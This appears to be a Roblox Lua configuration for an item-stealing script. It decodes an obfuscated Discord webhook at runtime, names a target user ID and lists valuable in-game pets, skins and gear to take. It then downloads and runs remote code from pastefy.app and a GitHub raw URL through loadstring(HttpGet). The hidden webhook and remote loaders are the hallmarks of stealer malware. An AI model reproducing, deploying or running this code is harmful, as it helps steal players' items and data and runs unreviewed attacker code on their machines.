local genv = getgenv()

genv.GOOD_WEBHOOK = (function()
    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMjQ5Mjk2ODgzMTg4MTIyNi9Gb0MtSEdIS3FxSHRLVDdDaFQwY1VJR1R3T1lHdVlWaGVQeDFCQzVXN2JrWS15S0Rrd3U4eV90UlZrSDlrN3kyY0tnZw=="
    local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o,b={},{}
    for i=1,#B do b[B:sub(i,i)]=i-1 end
    local n,bits=0,0
    for i=1,#d do
        local c=d:sub(i,i)
        if c~='=' then
            local v=b[c]
            if v then
                n=n*64+v; bits=bits+6
                if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
            end
        end
    end
    return table.concat(o)
end)()

genv.TARGET_USER_ID = 10279786442

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bumbatron",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "La Breakfast Combinasion",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "La Fuse Machine",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "Yetimatic",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "La Ginger Sekolah",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Rubiko and Kubiko",
    "Capitano Americano",
    "Examen Bros",
    "Los Spaghettis",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Queen Bee",
    "Cloverat Clapat",
    "La Summer Grande",
    "Los Tictacs",
    "Spaghetti Tualetti",
    "Candini Fluffini",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "La Easter Grande",
    "Steakini Fattini",
    "Garama and Madundung",
    "La Anniversary Grande",
    "Nacho Spyder",
    "Rosetti Tualetti",
    "Scorpino Coasterino",
    "Money Money Bros",
    "Gold Gold Gold",
    "Jolly Jolly Sahur",
    "Lavadorito Spinito",
    "Gym Bros",
    "Ketchuru and Musturu",
    "Los Tangcitos",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "La Lucky Grande",
    "La Romantic Grande",
    "Orcaledon",
    "Swaggy Bros",
    "Tictac Sahur",
    "Dug Dug Dug",
    "Ketupat Kepat",
    "La Taco Combinasion",
    "Coco and Mango",
    "Tang Tang Keletang",
    "Abyssaloco",
    "Esok Goala",
    "Fragola La La La",
    "Lovin Rose",
    "Los Tacoritas",
    "Eviledon",
    "Los Primos",
    "Esok Sekolah",
    "La Jolly Grande",
    "Los Cupids",
    "Los Mariachis",
    "Los Puggies",
    "Sand Sand Sand",
    "W or L",
    "Globa Steppa",
    "Gobblino Uniciclino",
    "Tralaledon",
    "Mieteteira Bicicleteira",
    "Tuff Toucan",
    "Chillin Chili",
    "Chipso and Queso",
    "Money Money Reindeer",
    "La Spooky Grande",
    "Bacuru and Egguru",
    "Los Bros",
    "La Extinct Grande",
    "Los Candies",
    "Los Fruits",
    "Celularcini Viciosini",
    "Los 67",
    "Capitano Gullini",
    "Los Mobilis",
    "Churrito Bunnito",
    "Money Money Puggy",
    "Cigno Fulgoro",
    "Los Hotspotsitos",
    "Los Jolly Combinasionas",
    "Los Spooky Combinasionas",
    "Los Planitos",
    "Snailo Clovero",
    "Girafini Raftini",
    "Chicleteira Cupideira",
    "DJ Panda",
    "Las Sis",
    "Camera Ramena",
    "Spinny Hammy",
    "Los Sweethearts",
    "Baskito",
    "Chicleteira Surfeiteira",
    "Tacorita Bicicleta",
    "Bananito",
    "Chicleteira Noelteira",
    "Los Combinasionas",
    "Nuclearo Dinossauro",
    "Chimnino",
    "Noo My Gold",
    "Noo My Heart",
    "Swag Soda",
    "Mariachi Corazoni",
    "Tacorillo Crocodillo",
    "La Grande Combinasion",
    "Los 25",
    "Donkeyturbo Express",
    "John Doe",
    "Los Chicleteiras",
    "Quesadillo Vampiro",
    "Octoball",
    "Horegini Boom",
    "Glaciator",
    "La Sahur Combinasion",
    "Noo my examine",
    "1x1x1x1",
    "Noobini Pizzanini",
    "Tim Cheese",
    "Fluriflura"
}

genv.ALLOWED_BASESKINS = {
    ["Rose"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true,
    ["Octo"] = true,
    ["Valentines"] = true,
    ["Easter"] = true,
    ["Lucky"] = true,
    ["Aquatic"] = true,
    ["Tralala"] = true
}

genv.ALLOWED_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Divine Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Radioactive Airstrike"] = true,
    ["Yin Yang Lamp"] = true,
    ["Demon's Head"] = true,
    ["Lava Slap"] = true,
    ["Lava Blaster"] = true,
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Candy Sentry"] = true,
    ["Phantom Slap"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/BEUKKcZd/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
